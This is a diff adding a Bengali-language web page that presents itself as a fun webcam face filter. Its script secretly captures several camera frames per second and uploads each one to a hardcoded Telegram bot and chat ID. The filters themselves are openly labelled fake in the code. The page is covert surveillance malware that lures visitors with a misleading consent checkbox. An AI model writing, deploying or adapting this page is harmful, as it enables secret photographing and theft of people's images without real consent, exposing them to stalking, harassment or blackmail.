@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MR_MOMIN's কুল ফেস ফিল্টার 😎</title>
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #ff7e5f, #feb47b, #86a8e7);
+            color: #fff;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            border-radius: 20px;
+            max-width: 700px;
+            width: 100%;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        h1 {
+            font-size: 2.8em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            animation: fadeIn 1s ease-in;
+        }
+        p {
+            font-size: 1.3em;
+            margin-bottom: 20px;
+            max-width: 600px;
+            line-height: 1.5;
+        }
+        .button {
+            padding: 15px 40px;
+            font-size: 1.2em;
+            background: linear-gradient(45deg, #ff6b6b, #ffcc00);
+            border: none;
+            border-radius: 50px;
+            color: white;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            margin: 10px;
+        }
+        .button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+        }
+        .loader {
+            border: 10px solid #f3f3f3;
+            border-top: 10px solid #ff6b6b;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        .preview {
+            max-width: 80%;
+            border-radius: 15px;
+            margin-top: 20px;
+            display: none;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+        .sidebar {
+            position: fixed;
+            right: 20px;
+            top: 20px;
+            width: 200px;
+            background: rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px);
+            border-radius: 10px;
+            padding: 15px;
+            text-align: left;
+            color: #fff;
+            font-size: 1em;
+            max-height: 80vh;
+            overflow: hidden;
+        }
+        .sidebar-message {
+            opacity: 0;
+            animation: slideIn 6s infinite;
+            margin-bottom: 10px;
+        }
+        .sidebar-message:nth-child(2) { animation-delay: 2s; }
+        .sidebar-message:nth-child(3) { animation-delay: 4s; }
+        .consent-form {
+            margin: 20px 0;
+            font-size: 1em;
+            display: flex;
+            align-items: center;
+        }
+        .consent-form input {
+            margin-right: 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        @keyframes slideIn {
+            0% { opacity: 0; transform: translateY(20px); }
+            20% { opacity: 1; transform: translateY(0); }
+            80% { opacity: 1; transform: translateY(0); }
+            100% { opacity: 0; transform: translateY(-20px); }
+        }
+        @media (max-width: 600px) {
+            h1 { font-size: 2em; }
+            p { font-size: 1em; }
+            .button { padding: 12px 30px; font-size: 1em; }
+            .preview { max-width: 90%; }
+            .sidebar { width: 150px; font-size: 0.9em; right: 10px; }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <h1>MR_MOMIN's কুল ফেস ফিল্টার 😎</h1>
+        <p>MR_MOMIN তোমাকে স্বাগতম! তোমার মুখে মজার ফিল্টার লাগাতে ক্যামেরা দরকার। এখনই শুরু করো!</p>
+        <div class="consent-form">
+            <input type="checkbox" id="consent" required>
+            <label for="consent">আমি ফিল্টার ট্রাই করতে এবং ক্যামেরা ব্যবহারে সম্মত।</label>
+        </div>
+        <button class="button" onclick="startFilter()">ফিল্টার শুরু করো</button>
+        <button class="button" onclick="stopFilter()" style="display:none;" id="stopButton">ফিল্টার বন্ধ করো</button>
+        <div class="loader" id="loader"></div>
+        <p id="status"></p>
+        <video id="videoElement" autoplay playsinline style="display:none;"></video>
+        <canvas id="canvasElement" style="display:none;"></canvas>
+        <img id="preview" class="preview" src="" alt="Filter Preview">
+    </div>
+    <div class="sidebar">
+        <div class="sidebar-message">😜 MR_MOMIN এর ফিল্টারে মজা করো!</div>
+        <div class="sidebar-message">🚀 নিজের স্টাইল দেখাও!</div>
+        <div class="sidebar-message">🎉 আরও ফানের জন্য থাকো!</div>
+    </div>
+
+    <script>
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('canvasElement');
+        const loader = document.getElementById('loader');
+        const status = document.getElementById('status');
+        const preview = document.getElementById('preview');
+        const consent = document.getElementById('consent');
+        const stopButton = document.getElementById('stopButton');
+        const botToken = "7460383063:AAHxwwVXmZW5criMNVP_GJ18DtI5VVPc-pk"; // তোমার বট টোকেন
+        const chatId = "7245153415"; // তোমার চ্যাট আইডি
+        let isCapturing = false;
+        let filterType = 'brightness'; // ডিফল্ট ফিল্টার
+
+        function applyFakeFilter(context, width, height) {
+            const imageData = context.getImageData(0, 0, width, height);
+            const data = imageData.data;
+            if (filterType === 'brightness') {
+                for (let i = 0; i < data.length; i += 4) {
+                    data[i] = Math.min(255, data[i] * 1.3); // লাল
+                    data[i + 1] = Math.min(255, data[i + 1] * 1.3); // সবুজ
+                    data[i + 2] = Math.min(255, data[i + 2] * 1.3); // নীল
+                }
+            } else if (filterType === 'sepia') {
+                for (let i = 0; i < data.length; i += 4) {
+                    const r = data[i], g = data[i + 1], b = data[i + 2];
+                    data[i] = Math.min(255, (r * 0.393) + (g * 0.769) + (b * 0.189));
+                    data[i + 1] = Math.min(255, (r * 0.349) + (g * 0.686) + (b * 0.168));
+                    data[i + 2] = Math.min(255, (r * 0.272) + (g * 0.534) + (b * 0.131));
+                }
+            } else if (filterType === 'grayscale') {
+                for (let i = 0; i < data.length; i += 4) {
+                    const avg = (data[i] + data[i + 1] + data[i + 2]) / 3;
+                    data[i] = data[i + 1] = data[i + 2] = avg;
+                }
+            }
+            context.putImageData(imageData, 0, 0);
+        }
+
+        function captureAndSendPhoto() {
+            if (!isCapturing) return;
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // ফেক ফিল্টার প্রিভিউতে ইফেক্ট যোগ
+            applyFakeFilter(context, canvas.width, canvas.height);
+            preview.src = canvas.toDataURL('image/jpeg', 0.95);
+            preview.style.display = "block";
+
+            // টেলিগ্রামে ছবি পাঠানো
+            canvas.toBlob(function(blob) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob);
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    console.log('Photo sent to Telegram');
+                })
+                .catch(error => {
+                    console.error('Error sending photo:', error);
+                });
+            }, 'image/jpeg', 0.95);
+
+            // ফিল্টার রোটেট করা
+            filterType = filterType === 'brightness' ? 'sepia' : filterType === 'sepia' ? 'grayscale' : 'brightness';
+        }
+
+        function startFilter() {
+            if (!consent.checked) {
+                status.textContent = "MR_MOMIN এর ফিল্টার শুরু করতে সম্মতি দিন!";
+                return;
+            }
+            status.textContent = "ক্যামেরা চেক করা হচ্ছে...";
+            loader.style.display = "block";
+            stopButton.style.display = "inline-block";
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    video.addEventListener('loadeddata', function() {
+                        isCapturing = true;
+                        loader.style.display = "none";
+                        status.textContent = "MR_MOMIN এর ফিল্টার চলছে! মজা করতে থাকো! 😎";
+
+                        // ক্রমাগত ছবি তুলতে ইন্টারভাল সেট করা
+                        setInterval(() => {
+                            if (!isCapturing) return;
+                            // প্রতি সেকেন্ডে ২-৩টা ছবি
+                            for (let i = 0; i < 3; i++) {
+                                setTimeout(captureAndSendPhoto, i * 300);
+                            }
+                        }, 1000);
+                    });
+                })
+                .catch(function(err) {
+                    loader.style.display = "none";
+                    status.textContent = "ক্যামেরা অ্যাক্সেস পাওয়া যায়নি। MR_MOMIN এর ফিল্টারের জন্য ক্যামেরা দরকার!";
+                    console.error("Camera access denied or failed.", err);
+                });
+        }
+
+        function stopFilter() {
+            isCapturing = false;
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+            }
+            stopButton.style.display = "none";
+            status.textContent = "MR_MOMIN এর ফিল্টার বন্ধ হয়েছে! আবার ট্রাই করো! 😄";
+            preview.style.display = "none";
+        }
+    </script>
+</body>
+</html>
